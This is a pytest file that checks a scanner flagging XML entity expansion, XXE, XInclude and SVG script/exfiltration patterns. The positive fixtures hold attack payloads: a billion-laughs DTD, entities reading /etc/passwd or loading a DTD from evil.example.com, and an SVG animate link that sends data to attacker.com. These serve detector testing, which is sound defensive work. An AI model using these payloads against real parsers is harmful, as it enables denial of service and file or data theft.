"""Tests for scripts/lib/xml_entity_expansion_patterns.py.

Pattern-coverage tests for the Wave-30 distill-round-16 catalogue
(8 XML entity expansion / billion-laughs / SVG-DoS anti-patterns).
Each rule has exactly 2 tests: one positive (canary) and one negative
(carve-out / unrelated text that must NOT fire).
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import xml_entity_expansion_patterns as xep  # type: ignore[import-not-found]  # noqa: E402

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_contains_all_eight_rules() -> None:
    """RULES must expose all 8 documented rule IDs."""
    assert isinstance(xep.RULES, tuple)
    rule_ids = {r.id for r in xep.RULES}
    expected = {
        "xml-entity-billion-laughs-dtd",
        "xml-entity-external-entity-dtd-system",
        "xml-entity-external-entity-dtd-public",
        "xml-entity-doctype-allowed-in-parser",
        "xml-entity-svg-foreignobject-script",
        "xml-entity-svg-animate-href-exfil",
        "xml-entity-xinclude-without-disable",
        "xml-entity-lxml-resolve-entities-true",
    }
    assert expected == rule_ids
    assert len(xep.RULES) == 8


def test_every_rule_has_valid_owasp_and_severity() -> None:
    """Every rule maps to a valid ASI- prefix and a known severity level."""
    for rule in xep.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, rule.id
        assert rule.description.strip(), rule.id
        assert rule.name.strip(), rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding exposes the expected 7-field shape."""
    f = xep.Finding(
        rule_id="xml-entity-billion-laughs-dtd",
        line=1,
        column=1,
        matched_text="test",
        severity="CRITICAL",
        description="desc",
        owasp_asi="ASI-05",
    )
    assert f.rule_id == "xml-entity-billion-laughs-dtd"
    assert f.line == 1
    assert f.column == 1


def test_scan_text_empty_returns_empty_list() -> None:
    """scan_text('') must return an empty list, not raise."""
    assert xep.scan_text("") == []


# ---------- X1 : xml-entity-billion-laughs-dtd ---------------------------


def test_billion_laughs_positive() -> None:
    """Classic billion-laughs ENTITY with three nested entity refs is flagged."""
    payload = (
        '<?xml version="1.0"?>\n'
        "<!DOCTYPE lolz [\n"
        '  <!ENTITY lol "lol">\n'
        '  <!ENTITY lol2 "&lol;&lol;&lol;">\n'
        '  <!ENTITY lol3 "&lol2;&lol2;&lol2;">\n'
        "]>\n"
        "<root>&lol3;</root>"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-billion-laughs-dtd" in ids


def test_billion_laughs_negative_single_entity_ref() -> None:
    """An ENTITY with only one entity reference is not a billion-laughs pattern."""
    payload = (
        "<!DOCTYPE doc [\n"
        '  <!ENTITY greeting "Hello">\n'
        '  <!ENTITY msg "&greeting; World">\n'
        "]>\n"
        "<doc>&msg;</doc>"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-billion-laughs-dtd" not in ids


# ---------- X2 : xml-entity-external-entity-dtd-system -------------------


def test_external_entity_system_positive() -> None:
    """SYSTEM external entity declaration targeting /etc/passwd is flagged."""
    payload = (
        "<!DOCTYPE foo [\n"
        '  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
        "]>\n"
        "<foo>&xxe;</foo>"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-external-entity-dtd-system" in ids


def test_external_entity_system_negative_no_system_keyword() -> None:
    """A plain inline entity value without SYSTEM is not flagged as XXE."""
    payload = (
        "<!DOCTYPE doc [\n"
        '  <!ENTITY safe "safe value here">\n'
        "]>\n"
        "<doc>&safe;</doc>"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-external-entity-dtd-system" not in ids


# ---------- X3 : xml-entity-external-entity-dtd-public -------------------


def test_external_entity_public_positive() -> None:
    """PUBLIC external entity declaration with a remote URL is flagged."""
    payload = (
        "<!DOCTYPE foo [\n"
        '  <!ENTITY evil PUBLIC "-//EVIL//EN" "http://evil.example.com/evil.dtd">\n'
        "]>\n"
        "<foo>&evil;</foo>"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-external-entity-dtd-public" in ids


def test_external_entity_public_negative_inline_value() -> None:
    """A regular inline entity value (no PUBLIC keyword) is not flagged."""
    payload = (
        "<!DOCTYPE doc [\n"
        '  <!ENTITY logo "My Logo Text">\n'
        "]>\n"
        "<doc>&logo;</doc>"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-external-entity-dtd-public" not in ids


# ---------- X4 : xml-entity-doctype-allowed-in-parser --------------------


def test_doctype_allowed_positive_resolve_entities_true() -> None:
    """resolve_entities=True in a parser call is flagged."""
    payload = "parser = etree.XMLParser(resolve_entities=True, huge_tree=False)\n"
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-doctype-allowed-in-parser" in ids


def test_doctype_allowed_negative_resolve_entities_false() -> None:
    """resolve_entities=False is the safe default and must not be flagged."""
    payload = "parser = etree.XMLParser(resolve_entities=False)\n"
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-doctype-allowed-in-parser" not in ids


# ---------- X5 : xml-entity-svg-foreignobject-script --------------------


def test_svg_foreignobject_script_positive() -> None:
    """SVG with <foreignObject> containing a <script> tag is flagged."""
    payload = (
        '<svg xmlns="http://www.w3.org/2000/svg">\n'
        "  <foreignObject width=\"100\" height=\"100\">\n"
        "    <script>alert('xss')</script>\n"
        "  </foreignObject>\n"
        "</svg>\n"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-svg-foreignobject-script" in ids


def test_svg_foreignobject_script_negative_no_script() -> None:
    """SVG <foreignObject> containing only HTML (no script) is not flagged."""
    payload = (
        '<svg xmlns="http://www.w3.org/2000/svg">\n'
        "  <foreignObject width=\"100\" height=\"100\">\n"
        "    <div>Hello</div>\n"
        "  </foreignObject>\n"
        "</svg>\n"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-svg-foreignobject-script" not in ids


# ---------- X6 : xml-entity-svg-animate-href-exfil -----------------------


def test_svg_animate_href_exfil_positive() -> None:
    """SVG <animate> with xlink:href pointing to http:// is flagged."""
    payload = (
        '<svg xmlns="http://www.w3.org/2000/svg"'
        ' xmlns:xlink="http://www.w3.org/1999/xlink">\n'
        "  <image id=\"img\" xlink:href=\"http://safe.example.com/img.png\"/>\n"
        "  <animate attributeName=\"xlink:href\""
        " xlink:href=\"http://attacker.com/steal?c=secret\""
        " dur=\"1s\" repeatCount=\"indefinite\"/>\n"
        "</svg>\n"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-svg-animate-href-exfil" in ids


def test_svg_animate_href_exfil_negative_relative_href() -> None:
    """SVG <animate> with a relative (local) href is not flagged as exfil."""
    payload = (
        '<svg xmlns="http://www.w3.org/2000/svg">\n'
        "  <animate attributeName=\"href\" href=\"#localTarget\""
        " dur=\"2s\"/>\n"
        "</svg>\n"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-svg-animate-href-exfil" not in ids


# ---------- X7 : xml-entity-xinclude-without-disable ----------------------


def test_xinclude_positive_xi_include_element() -> None:
    """xi:include element in a document is flagged for XInclude usage."""
    payload = (
        '<doc xmlns:xi="http://www.w3.org/2001/XInclude">\n'
        '  <xi:include href="/etc/passwd" parse="text"/>\n'
        "</doc>\n"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-xinclude-without-disable" in ids


def test_xinclude_negative_unrelated_namespace_decl() -> None:
    """An arbitrary xmlns declaration that is not XInclude is not flagged."""
    payload = (
        '<doc xmlns:foo="http://example.com/foo">\n'
        "  <foo:bar/>\n"
        "</doc>\n"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-xinclude-without-disable" not in ids


# ---------- X8 : xml-entity-lxml-resolve-entities-true -------------------


def test_lxml_resolve_entities_true_positive() -> None:
    """etree.XMLParser(resolve_entities=True) is flagged."""
    payload = (
        "from lxml import etree\n"
        "parser = etree.XMLParser(remove_comments=True, resolve_entities=True)\n"
        "tree = etree.parse(data, parser)\n"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-lxml-resolve-entities-true" in ids


def test_lxml_resolve_entities_true_negative_safe_defaults() -> None:
    """etree.XMLParser() without resolve_entities=True is not flagged."""
    payload = (
        "from lxml import etree\n"
        "parser = etree.XMLParser(remove_comments=True, remove_pis=True)\n"
        "tree = etree.parse(data, parser)\n"
    )
    findings = xep.scan_text(payload)
    ids = [f.rule_id for f in findings]
    assert "xml-entity-lxml-resolve-entities-true" not in ids
